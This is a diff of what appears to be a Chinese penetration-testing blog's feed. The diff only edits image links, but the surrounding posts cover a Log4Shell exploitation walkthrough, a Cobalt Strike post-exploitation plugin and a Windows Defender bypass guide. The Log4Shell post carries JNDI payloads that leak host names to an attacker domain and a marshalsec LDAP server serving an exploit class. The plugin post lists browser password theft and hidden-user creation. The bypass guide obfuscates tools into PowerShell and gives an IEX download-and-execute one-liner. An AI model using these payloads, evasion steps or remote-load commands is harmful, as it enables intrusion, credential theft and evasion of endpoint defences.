@@ -3698,11 +3698,11 @@ window.location.href="/Ladon/CVE-2022-36537.html";
 <p>####（7）成功getshell</p>
 <p>接下来就可以执行任意命令，linux也可以使用自带NC监听，对于windows可使用PowerLadon内存加载后渗透。</p>
 <p>图片</p>
-<p>Ladon 10.9 20230302<br>[u]LadonExp     编译EXE支持执行CMD  Payload变量$cmd$ 变量$b64cmd$<br>[u]web         CS版不含该模块  识别JAVA  JNDI_LDAP  JNDI_RMI请求<br>[u]WebLogicPoc    CVE-2020-14883高危漏洞检测可识别出Windows或Linux<br>[-]PortTran      CS版移除 端口转发工具<br>[u]Ladon911      本地测试用的全功能版(即保留旧漏洞和一些过时功能)<br>[-]Help        仅911版保留    功能很多 建议看Wiki或Ladon Study<br>[-]SMBGhost      仅CS和911版保留 Win10默认自动更新，实战遇到概率低<br>[-]vsFTPdPoc    仅CS和911版保留 2011漏洞过旧，实战遇到概率低<br>[-]CVE-2021-36934  仅CS和911版保留 Win10默认自动更新，实战可用概率低<br>[-]PhpStudyPoc    仅CS和911版保留<br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/Ladn85Subdomain.PNG"></p>
+<p>Ladon 10.9 20230302<br>[u]LadonExp     编译EXE支持执行CMD  Payload变量$cmd$ 变量$b64cmd$<br>[u]web         CS版不含该模块  识别JAVA  JNDI_LDAP  JNDI_RMI请求<br>[u]WebLogicPoc    CVE-2020-14883高危漏洞检测可识别出Windows或Linux<br>[-]PortTran      CS版移除 端口转发工具<br>[u]Ladon911      本地测试用的全功能版(即保留旧漏洞和一些过时功能)<br>[-]Help        仅911版保留    功能很多 建议看Wiki或Ladon Study<br>[-]SMBGhost      仅CS和911版保留 Win10默认自动更新，实战遇到概率低<br>[-]vsFTPdPoc    仅CS和911版保留 2011漏洞过旧，实战遇到概率低<br>[-]CVE-2021-36934  仅CS和911版保留 Win10默认自动更新，实战可用概率低<br>[-]PhpStudyPoc    仅CS和911版保留<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/Ladn85Subdomain.PNG"></p>
 <p>如果已整理好URL，可使用WhatCMS快速识别</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon url.txt WhatCMS</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/CS_WhatCMS.gif"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/CS_WhatCMS.gif"></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>911版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>10.10版本：K8小密圈</p>
 ]]></content>
       <categories>
@@ -3868,10 +3868,10 @@ window.location.href="/Ladon/ExchangeScan.html";
 
 <h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">Ladon url ExchangeScan</span><br><span class="line">Ladon url.txt ExchangeScan</span><br></pre></td></tr></table></figure>
 
-<p>Ladon.exe for windows<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/ExchangeScan.PNG"></p>
-<p>Brute Exchange password<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/ExchangeScan.gif"></p>
-<p>Ladon for Cobalt Strike CLI<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/ExchangeScan_cs1.gif"></p>
-<p>Ladon for Cobalt Strike GUI<br><img alt data-original="https://k8gege.org/k8img/Ladon/cs/ExchangeScan_cs2.gif"></p>
+<p>Ladon.exe for windows<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/ExchangeScan.PNG"></p>
+<p>Brute Exchange password<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/ExchangeScan.gif"></p>
+<p>Ladon for Cobalt Strike CLI<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/ExchangeScan_cs1.gif"></p>
+<p>Ladon for Cobalt Strike GUI<br><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/ExchangeScan_cs2.gif"></p>
 <h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>History: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>9.1.1：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>10.8：K8小密圈</p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
 <img alt style="display: inline-block;width: 250px;height: 300px;" data-original="https://k8gege.org/img/k8team.jpg">
@@ -3889,7 +3889,7 @@ window.location.href="/Ladon/ExchangeScan.html";
   <entry>
     <title>〖工具〗log4Shell核弹级漏洞复现&amp;Ladon批量检测</title>
     <url>/p/log4shell.html</url>
-    <content><![CDATA[<p><img alt data-original="https://k8gege.org/k8img/posts/log4j/log4shell_1.PNG"></p>
+    <content><![CDATA[<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_1.PNG"></p>
 <h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Apache Log4j2是一款优秀的Java日志框架。近日，漏洞银行安全团队注意到了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。</p>
 <h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Log4j2 中存在JNDI注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。</p>
 <h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Log4j 2.0 &lt;= 2.15.0-rc1</p>
@@ -3904,20 +3904,20 @@ window.location.href="/Ladon/ExchangeScan.html";
 <h3 id="漏洞复现1"><a href="#漏洞复现1" class="headerlink" title="漏洞复现1"></a>漏洞复现1</h3><p>启用Ladon的web监听，编译执行Poc项目，可看到Ladon回显目标IP以及提交的数据，Ldap出现一些特殊符号，最明显的是几个笑脸，Rmi回显前几个字符串为JRMI，回显以下特征说明目标存在jdni注入漏洞。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon web 800</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://k8gege.org/k8img/posts/log4j/log4shell_2.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_2.PNG"></p>
 <p>其实也不是非要jndi来远程测试漏洞，log4j也支持java获取信息环境变量等，本地APP需要测试还好，实战是盲测，不像本地可以后台看，实战你只能外带，所以才用到jndi协议，有些人问为什么不用其它协议，因为受漏洞限制只能jndi协议，利用你就得看jndi支持什么协议，你才能利用什么协议。如以下代码，编译项目执行，会输出版本和操作系统信息。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">logger.error(<span class="string">"<span class="variable">$&#123;java:version&#125;</span>/<span class="variable">$&#123;java:os&#125;</span>"</span>);</span><br></pre></td></tr></table></figure>
 
 <p>也可使用以下协议探测</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;jndi:ldap:/&#125;</span></span><br><span class="line"><span class="variable">$&#123;jndi:ldaps:/&#125;</span></span><br><span class="line"><span class="variable">$&#123;jndi:rmi:/&#125;</span></span><br><span class="line"><span class="variable">$&#123;jndi:dns:/&#125;</span></span><br><span class="line"><span class="variable">$&#123;jndi:iiop:/&#125;</span></span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://k8gege.org/k8img/posts/log4j/log4shell_3.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_3.PNG"></p>
 <h3 id="漏洞环境2"><a href="#漏洞环境2" class="headerlink" title="漏洞环境2"></a>漏洞环境2</h3><p>使用docker搭建环境，这样可模拟从内网另一台机来攻击该机器</p>
 <p>docker pull vulfocus/log4j2-rce-2021-12-09:latest</p>
 <h3 id="启动环境2"><a href="#启动环境2" class="headerlink" title="启动环境2"></a>启动环境2</h3><p>docker run -d -P vulfocus/log4j2-rce-2021-12-09:latest</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/log4j/log4shell_4.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_4.PNG"></p>
 <h3 id="漏洞复现2"><a href="#漏洞复现2" class="headerlink" title="漏洞复现2"></a>漏洞复现2</h3><p>由于不知道漏洞触发点，使用LadonExp.exe盲测，发现注入点为Accept参数,测试方法所有参数均填写payload，目标URL填写需要测试的站点，点击Build_Exe，然后点击Test_exe测试即可。</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/log4j/log4shell_5.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_5.PNG"></p>
 <p>改成rmi协议时，发现无法触发，于是看了下环境的JDK版本，发现是292的，JDK1.8 191起默认不支持RMI协议，所以用rmi测试失败。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@4e4424eccb8d:/demo<span class="comment"># java -version</span></span><br><span class="line">openjdk version <span class="string">"1.8.0_292"</span></span><br><span class="line">OpenJDK Runtime Environment (build 1.8.0_292-8u292-b10-0ubuntu1~18.04-b10)</span><br><span class="line">OpenJDK 64-Bit Server VM (build 25.292-b10, mixed mode)</span><br></pre></td></tr></table></figure>
 
@@ -3935,7 +3935,7 @@ window.location.href="/Ladon/ExchangeScan.html";
 
 <h3 id="启动Ladp服务器"><a href="#启动Ladp服务器" class="headerlink" title="启动Ladp服务器"></a>启动Ladp服务器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">"http://192.168.250.83:800/#Exploit"</span></span><br></pre></td></tr></table></figure>
 <p>将漏洞复现1的POC代码修改，指向我们的ldap服务器，编译执行弹出calc</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/log4j/log4shell.gif"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell.gif"></p>
 <h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;jndi:ldap://$&#123;hostName&#125;</span>.log4shell.k8gege.org&#125;</span><br><span class="line"><span class="variable">$&#123;jndi:rmi://$&#123;hostName&#125;</span>.log4shell.k8gege.org&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="Ladon监听"><a href="#Ladon监听" class="headerlink" title="Ladon监听"></a>Ladon监听</h3><p>${jndi:ldap://192.168.1.8:800/test}<br>${jndi:rmi://192.168.1.8:800/test}</p>
@@ -3957,7 +3957,7 @@ JDK版本限制，jdk8u191之后RMI和LDAP默认不能从远程加载类
 
 目标允许出网，不能出网，存在洞你也不知道，除非你已进入内网，通过Ladon在内网监听，测试内网站点是否存在jndi漏洞。假设机器只允许dns出网，使用Dnslog探测存在漏洞，TCP协议出不了，ldap、rmi等无法加载class，你也拿不了shell啊，存在洞和能拿权限是两回事。</code></pre><p>PS: 该漏洞说大影响大嘛也是真的非常大，但说它鸡肋也鸡肋，因为我的目标就没一个成功的，或许存在洞的机器早已通过其它洞拿下，</p>
 <h3 id="有些人问为什么不用dnslog？"><a href="#有些人问为什么不用dnslog？" class="headerlink" title="有些人问为什么不用dnslog？"></a>有些人问为什么不用dnslog？</h3><p>你喜欢用dnslog的话也可以，没什么问题，只是这几天这洞玩的人太多，dnslog经常卡死，无法使用，这是第一个原因。其次使用dnslog，意味着我们的目标或者说正在测试只有内部人知道公司某些服务器使用log4j，若是别人也随机到和你相同的域名，你们公司存在漏洞的站点IP泄露出去，会是什么后果？使用自己的VPS来搭建的接收器才是最安全的，当然ldap或rmi协议出不来的话，就只能用dnslog来接收dns协议，因为Ladon无法监听DNS协议，当然要是你要时间也可以完全自己搭个DNS服务器还接收。</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/log4j/log4shell_6.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_6.PNG"></p>
 <h3 id="为什么Ladon能监听LDAP、RMI？"><a href="#为什么Ladon能监听LDAP、RMI？" class="headerlink" title="为什么Ladon能监听LDAP、RMI？"></a>为什么Ladon能监听LDAP、RMI？</h3><p>为什么ldap、rmi、http等协议Ladon可以监听到，因为它们本身就是特殊的tcp协议，所以Ladon当然能捕获到。初中有没学过正方形是特殊的长方形，就是说你把正方形说成长方形也没错，Ladon虽然主要只是解析HTTP协议，但也没完全对其它协议进行丢弃，只要对前面部份数据16进制原样解析还是会看到一些明显的字眼如JRMI协议，所以Ladon对于一些非HTTP协议也可以从控制台看出来，同理以后其它无回显漏洞也可以使用Ladon监听，之前我也发过3篇文章，Linux无回显渗透、Java无回显渗透、PowerShell等，大家一定要学会举一反三，不要非要等别人告诉你，你才知道在这种场景也能用。</p>
 <h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h4><p>更新至官方修复版本</p>
 <p><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2" target="_blank" rel="noopener">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
@@ -3992,21 +3992,21 @@ Visit <span id="busuanzi_value_page_pv"></span>
 window.location.href="https://k8gege.org/Ladon/cs911.html";
 </script>
 
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/Dragon.jpg"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/Dragon.jpg"></p>
 <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Ladon9.1.1插件右键功能已更新174个，相比9.1.0的131个新增了43个功能，本机密码新增4个主流浏览器Chrome、Firefox、Edge、Coccoc帐密、历史记录、Cookie等，新增CMD常用渗透命令30+，Ladon9.1.1插件采用分离式加载，减少网络卡时加载Ladon导致CS假死情况。其它功能，新增.net测试&amp;powershell测试，用于测试目标杀软是否拦截CS加载.NET程序或Powershell等，具体功能大家实战测试吧，实战为王，多说无益。</p>
 <h3 id="Ladon主程序"><a href="#Ladon主程序" class="headerlink" title="Ladon主程序"></a>Ladon主程序</h3><h4 id="Ladon-9-1-1-20211211更新功能"><a href="#Ladon-9-1-1-20211211更新功能" class="headerlink" title="Ladon 9.1.1 20211211更新功能"></a>Ladon 9.1.1 20211211更新功能</h4><p>=======================<br>[u]OnlinePC 新增Exchange探测主机<br>[u]OnlinePC 新增MSSQL探测存活主机<br>[u]OnlinePC 新增SMB探测存活主机<br>[u]OnlinePC 新增WMI探测存活主机<br>[u]OnlinePC 新增WinRM探测存活主机<br>[u]MS17010     解决部分OS版本乱码问题<br>[-]Dumplsass模块移除转PowerShell免杀<br>[u]WifiPwd  读wifi密码含当前连接WIFI<br>[u]GetInfo     含当前连接WIFI信息</p>
 <h4 id="GUI-9-1-1-20211211更新功能"><a href="#GUI-9-1-1-20211211更新功能" class="headerlink" title="GUI 9.1.1 20211211更新功能"></a>GUI 9.1.1 20211211更新功能</h4><p>[u]OnlinePC 表格调整<br>[u]cmddll AddUser系统登陆界面隐藏添加用户<br>修复重复显示的BUG 却除DNS只保留域名<br>MS17010 解决OS版本乱码(SMBINFO)</p>
-<h3 id="无图无真相（CS插件部分截图）"><a href="#无图无真相（CS插件部分截图）" class="headerlink" title="无图无真相（CS插件部分截图）"></a>无图无真相（CS插件部分截图）</h3><h4 id="1-网络资产收集功能"><a href="#1-网络资产收集功能" class="headerlink" title="1.网络资产收集功能"></a>1.网络资产收集功能</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/911/911_0.PNG"></p>
-<h4 id="2-操作系统信息探测"><a href="#2-操作系统信息探测" class="headerlink" title="2.操作系统信息探测"></a>2.操作系统信息探测</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/911/911_1.PNG"></p>
-<h4 id="3-高危远程漏洞探测"><a href="#3-高危远程漏洞探测" class="headerlink" title="3.高危远程漏洞探测"></a>3.高危远程漏洞探测</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/911/911_2.PNG"></p>
-<h4 id="4-本机信息收集"><a href="#4-本机信息收集" class="headerlink" title="4.本机信息收集"></a>4.本机信息收集</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/911/911_3.PNG"></p>
-<h4 id="5-本机密码读取"><a href="#5-本机密码读取" class="headerlink" title="5.本机密码读取"></a>5.本机密码读取</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/911/911_4.PNG"></p>
-<h4 id="6-网络密码审计"><a href="#6-网络密码审计" class="headerlink" title="6.网络密码审计"></a>6.网络密码审计</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/911/911_5.PNG"></p>
+<h3 id="无图无真相（CS插件部分截图）"><a href="#无图无真相（CS插件部分截图）" class="headerlink" title="无图无真相（CS插件部分截图）"></a>无图无真相（CS插件部分截图）</h3><h4 id="1-网络资产收集功能"><a href="#1-网络资产收集功能" class="headerlink" title="1.网络资产收集功能"></a>1.网络资产收集功能</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/911/911_0.PNG"></p>
+<h4 id="2-操作系统信息探测"><a href="#2-操作系统信息探测" class="headerlink" title="2.操作系统信息探测"></a>2.操作系统信息探测</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/911/911_1.PNG"></p>
+<h4 id="3-高危远程漏洞探测"><a href="#3-高危远程漏洞探测" class="headerlink" title="3.高危远程漏洞探测"></a>3.高危远程漏洞探测</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/911/911_2.PNG"></p>
+<h4 id="4-本机信息收集"><a href="#4-本机信息收集" class="headerlink" title="4.本机信息收集"></a>4.本机信息收集</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/911/911_3.PNG"></p>
+<h4 id="5-本机密码读取"><a href="#5-本机密码读取" class="headerlink" title="5.本机密码读取"></a>5.本机密码读取</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/911/911_4.PNG"></p>
+<h4 id="6-网络密码审计"><a href="#6-网络密码审计" class="headerlink" title="6.网络密码审计"></a>6.网络密码审计</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/911/911_5.PNG"></p>
 <h4 id="7-本地提权"><a href="#7-本地提权" class="headerlink" title="7.本地提权"></a>7.本地提权</h4><p>新增Beacon2System，将CS当前会话提升至system权限(该功能需当前会话处于admin权限)。Priviledges特权启用(一般情况下提权EXP会自动复制相应特权以达到提权的目的，通过相 关EXP上线的CS继承其权限以及特权，但是有时候需要在CS执行其它程序，而其它程序需要操作其它功能，而那些功能使用前提需要相应特权)，特权说明:<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants?redirectedfrom=MSDN</a></p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/911/911_6.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/911/911_6.PNG"></p>
 <h4 id="8-其它功能"><a href="#8-其它功能" class="headerlink" title="8.其它功能"></a>8.其它功能</h4><p>1.NET测试，用于测试CS是否可加载.NET程序集，Win10_20H2系统的Defender或相关杀软，会对CS加载.NET程序进行拦截，若该功能可正常加载，再尝试使用Ladon，若无法加载，其它.NET写的也不需要测试了，因为你使用的话会和使用Mimikat一样会导致CS下线。一个小技巧，使用CS高危功能时最好多开一个会话，以免CS突然下线让你懵B。</p>
-<p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/911/911_7.PNG"></p>
-<h4 id="9-CMD渗透信息收集"><a href="#9-CMD渗透信息收集" class="headerlink" title="9.CMD渗透信息收集"></a>9.CMD渗透信息收集</h4><p><img alt data-original="https://k8gege.org/k8img/Ladon/cs/911/911_8.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/911/911_7.PNG"></p>
+<h4 id="9-CMD渗透信息收集"><a href="#9-CMD渗透信息收集" class="headerlink" title="9.CMD渗透信息收集"></a>9.CMD渗透信息收集</h4><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/cs/911/911_8.PNG"></p>
 <p>当然，如果你熟悉Ladon命令的可以直接在Beacon上执行相应命令即可，如使用Ladon GetID命令查看目标机器名、机器ID、CPUID、硬盘ID、MAC地址等信息，主要用于区分一些大内网同名机器或其它用途；使用Ladon 192.168.1.8/24 MS17010探测C段机器是否存在MS17010漏洞。若是你不熟悉可以使用GUI右键菜单(打X的选项代表右键暂未支持)，为了方便新人或不太熟的人，实际上时间久了，我也会忘记Ladon的功能，也需要右键GUI，毕竟上百功能。</p>
 <h3 id="CS插件"><a href="#CS插件" class="headerlink" title="CS插件"></a>CS插件</h3><p>=======================<br>Ladon 9.1.1 巨龙拉冬<br>CS右键174个功能模块<br>Update 2021.12.11<br>=======================</p>
 <h3 id="0x001-网络资产收集"><a href="#0x001-网络资产收集" class="headerlink" title="0x001 网络资产收集"></a>0x001 网络资产收集</h3><p>1.多协议探测存活主机<br>2.多协议探测存活IP<br>3.仅ICMP探测存活(快)<br>4.系统Ping探测存活<br>5.Oxid多网卡主机探测<br>6.DNS多网卡主机探测<br>7.多协议操作系统探测<br>8.网站、标题、Banner<br>9.智能网站CMS识别<br>10.常见端口服务探测<br>11.Shiro网站探测<br>12.Cisco设备探测<br>13.LDAP服务器探测<br>14.FTP服务器探测<br>15.枚举MSSQL服务器<br>16.枚举共享资源</p>
@@ -4050,12 +4050,12 @@ window.location.href="https://k8gege.org/Ladon/cs911.html";
     <url>/p/bypass_win10_20h2_defender.html</url>
     <content><![CDATA[<p>WIN10更新至最新版20H2发现，查杀能力比以前强了不少，特别是针对CS加载.NET程序集或NIM加载.NET的查杀，毕竟你要调用的函数微软很了解，它想拦截想杀还是比较容易的。但是不知道大家有没听说过一个故事“微软的编程工具的开发工程师，编写程序时，也需要查阅文档”，说明什么？微软系统的API很多，是微软写的没错，但又不是一个人自己写的，就算是一个人自己写的，功能那么多，他也根本记不起，用到自己的东西也要查阅文档，就像我用Ladon有时也要查阅文档，这很正常，因为我写过的工具或功能太多，有些久不用，甚至都会忘记我自己写过什么。所以我想说的是，微软就算做杀软，它也不可能做到全面监控，因为参与开发杀软的人，它不可能对微软系统上百万函数了如指掌，越是大型程序，需要的开发人员越多，很多人都只是负责某一模块对整个系统可能只是一只半解，所以Defender虽然查杀能力某些方面有点加强了，但是很多方面它依旧无法查杀，还没达到自己人写的程序就真比其它杀软牛B的地步，那些专门做杀软的，逆向能力很强，有BIN文件对他们来说就相当于源代码，很多人比微软员工还要了解win系统。举个简单的例子，你在某公司工作，有些员工可能你压根都不认识，更别说和公司所有程序员了解他们所写过的代码，微软的操作系统有多少人来写，defender这部门又只有多少人，他们怎么可能把所有函数都了解，就算24小时不吃饭不做任何事，只研究代码也做不到全面查杀或拦截，至少最近几年还比不过很多主流杀软。任何一个杀软能查杀一个全球大量人使用的工具这是应该也是必须的很常规的考验，杀了不代表这杀软就强了，但是不杀它一定是垃圾。如CS，因为全球大量人使用，任何一个杀软杀它都说明不了什么。好了废话不多说，进入正题。</p>
 <h3 id="GO异或加密免杀"><a href="#GO异或加密免杀" class="headerlink" title="GO异或加密免杀"></a>GO异或加密免杀</h3><p>使用GO免杀CS的shellcode，生成的dll上线成功执行CMD命令正常，但执行dumplsass等相关高危功能或加载Ladon时被杀，CS直接下线，甚至加载一个只输出hello world的.net程序集也会被杀，这样会导致我们瞬间失去很多后渗透工具插件带来的便利，这是2021.11.19号的病毒库查杀情况。</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/win10/20h2_1.PNG"></p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/win10/20h2_2.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_1.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_2.PNG"></p>
 <p>这种情况怎么解决？CS无法加载Ladon插件，那么我们只能把Ladon传过去了，但测试发现Ladon.exe也被杀，我的发克，竟然还说是木马。</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/win10/20h2_3.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_3.PNG"></p>
 <h3 id="Nim免杀-net"><a href="#Nim免杀-net" class="headerlink" title="Nim免杀.net"></a>Nim免杀.net</h3><p>9月份的时候该方法针对Denfender还是可以的，所以我们可以尝试一下。使用net2nim工具将.net程序转换成bytes，并使用nim加载编译生成新程序,可过一些杀软及旧版Win10 Defender，如图所示</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/win10/20h2_4.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_4.PNG"></p>
 <h4 id="安装Nim"><a href="#安装Nim" class="headerlink" title="安装Nim"></a>安装Nim</h4><p><a href="https://nim-lang.org/" target="_blank" rel="noopener">https://nim-lang.org/</a><br>下载zip大约20M<br>设置环境变量  F:\nim-1.4.8\bin</p>
 <h4 id="安装winim"><a href="#安装winim" class="headerlink" title="安装winim"></a>安装winim</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\k8gege\Desktop&gt;nimble install winim</span><br><span class="line">Downloading https://github.com/khchen/winim using git</span><br><span class="line">  Verifying dependencies <span class="keyword">for</span> winim@3.6.1</span><br><span class="line"> Installing winim@3.6.1</span><br><span class="line">   Success: winim installed successfully.</span><br></pre></td></tr></table></figure>
 
@@ -4063,19 +4063,19 @@ window.location.href="https://k8gege.org/Ladon/cs911.html";
 
 
 <p>使用Nim加载.net程序集也可以免杀不少杀软，在此版本之前也可过Defender，但Win10更新至20H2后虽然静态不杀，但一执行会被拦截，提示CLR加载错误，程序也不杀，但无法使用其功能，相当于免杀失败。</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/win10/20h2_5.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_5.PNG"></p>
 <h3 id="使用LadonGUI免杀-NET程序"><a href="#使用LadonGUI免杀-NET程序" class="headerlink" title="使用LadonGUI免杀.NET程序"></a>使用LadonGUI免杀.NET程序</h3><p>怎么办？我们需要Ladon扫描内网或进行横向移动，但是EXE被杀了，还有办法吗?答案是有的，记得文章开头说过的话吗，Defender在某些方面是杀能力还是比较差的，如powershell、VBS、java、php啊等脚本类语言，不只是它在这方面，其它专做杀软的在这方面也不是很强。去年发布的Ladon 7.5的GUI版本开始就提供有一些PowerShell加密混淆方法，也包含了EXE转PowerShell，PowerShell转EXE功能，也发布过如何将EXE转成PowerShell的教程，以免杀最新版Ladon为例,首先将ladon.exe拖放至exe/dll(.net)文本框中，然后点击右边的”EXE-&gt;PowerShell”按钮，成功会生成Ladon.ps1，如果你只打算把PS1放在win10机器上使用，也可以转Ladon40.exe,毕竟有几个模块只支持.net4.0，当然转换其它.NET程序也一样。</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/win10/20h2_6.PNG"></p>
-<p>生成的PS1内容如下，已做好加载，如果是你自己写的程序，只需在第8行开始加入相关参数调用即可。若是Ladon请使用记事本打开ps1文件，复制红线所示@和@里的字符串很长可能有2M<br><img alt data-original="https://k8gege.org/k8img/posts/win10/20h2_7.PNG"></p>
-<p>再打开Ladon9.0.ps1或Ladon9.1.ps1找到里面那个很长的加密字符串，将刚转换的加密字符串粘贴替换，注意长度那里也需要替换，大小不对应也会导致PS1加载失败。<br><img alt data-original="https://k8gege.org/k8img/posts/win10/20h2_8.PNG"></p>
-<p>若发现哪些模块不可使用，可自行参考WIKI，将缺少的模块名称参数加入<br><img alt data-original="https://k8gege.org/k8img/posts/win10/20h2_9.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_6.PNG"></p>
+<p>生成的PS1内容如下，已做好加载，如果是你自己写的程序，只需在第8行开始加入相关参数调用即可。若是Ladon请使用记事本打开ps1文件，复制红线所示@和@里的字符串很长可能有2M<br><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_7.PNG"></p>
+<p>再打开Ladon9.0.ps1或Ladon9.1.ps1找到里面那个很长的加密字符串，将刚转换的加密字符串粘贴替换，注意长度那里也需要替换，大小不对应也会导致PS1加载失败。<br><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_8.PNG"></p>
+<p>若发现哪些模块不可使用，可自行参考WIKI，将缺少的模块名称参数加入<br><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_9.PNG"></p>
 <p>转换完成后，我们再测一下20H2的Defender,免杀成功，可以嗨起来了。无论使用远程还是本地加载Ladon.ps1，Defender都不杀了。</p>
 <h3 id="远程加载免杀"><a href="#远程加载免杀" class="headerlink" title="远程加载免杀"></a>远程加载免杀</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell -nop -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></table></figure>
 
